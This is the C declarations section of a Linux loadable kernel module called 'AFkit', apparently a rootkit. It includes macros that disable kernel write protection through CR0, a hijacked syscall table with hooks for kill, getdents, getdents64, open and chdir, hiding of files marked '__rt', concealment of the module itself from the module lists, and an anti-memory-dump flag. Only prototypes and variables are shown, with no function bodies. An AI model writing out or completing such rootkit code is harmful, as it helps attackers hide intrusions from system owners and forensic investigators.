// Kernel protection ON/OFF
#define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000))
#define GPF_ENABLE write_cr0(read_cr0() | 0x10000)

// Misc strings
#define HIDE_STRING "__rt"
#define MODULE_NAME "AFkit"

// Syscalls definitions and vars
unsigned long **syscall_table;

typedef asmlinkage int (*kill_ptr)(pid_t pid, int sig);
kill_ptr orig_kill;

typedef asmlinkage int (*getdents_ptr)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
getdents_ptr orig_getdents;

typedef asmlinkage int (*getdents64_ptr)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
getdents64_ptr orig_getdents64;

typedef asmlinkage long (*open_ptr)(const char *pathname, int flag, mode_t mode);
open_ptr orig_open;

typedef asmlinkage long (*chdir_ptr)(const char *pathname);
chdir_ptr orig_chdir;

// Drectory entry struct
struct linux_dirent {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	char d_name[256];
	char pad;
	char d_type;
};

// Command vars
static bool files_dirs_view = false;
static bool files_dirs_content = false;
static bool ram_dump_shield = false;
static bool module_hidden = false;

// Hide vars
static struct list_head *module_previous;
static struct list_head *module_kobj_previous;

// AFkit Function prototypes
static unsigned long **get_syscall_table(void);
static void hide_lkm(void);
static void unhide_lkm(void);
asmlinkage int custom_kill(pid_t, int);
asmlinkage int custom_chdir(const char *);
asmlinkage long custom_getdents(unsigned int, struct linux_dirent *, size_t);
asmlinkage long custom_getdents64(unsigned int, struct linux_dirent64 *, size_t);
asmlinkage int custom_open(const char *, int, mode_t);
static void hook_syscall_table(void);
static void restore_syscall_table(void);